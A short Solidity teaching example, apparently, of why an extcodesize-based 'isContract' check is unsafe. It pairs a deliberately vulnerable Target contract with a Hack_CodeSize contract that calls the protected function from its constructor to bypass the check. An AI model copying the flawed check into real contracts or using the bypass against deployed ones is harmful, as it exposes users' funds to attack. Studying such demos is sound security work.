// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;  
//pragma solidity ^0.8.0;
//  Resources: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol

contract Target {
    string public variable = "";

    function isContract(address account) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }


    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        variable = "Hello World!";
    }
}

contract FailedAttack {
    function attack(address _target) external {
        // This will fail
        Target(_target).protected();
    }
}

contract Hack_CodeSize {
    bool public isContract;

    // When contract is being created, code size (extcodesize) is 0.
    // This will bypass the isContract() check
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));

        // This will work
        Target(_target).protected();
    }
}
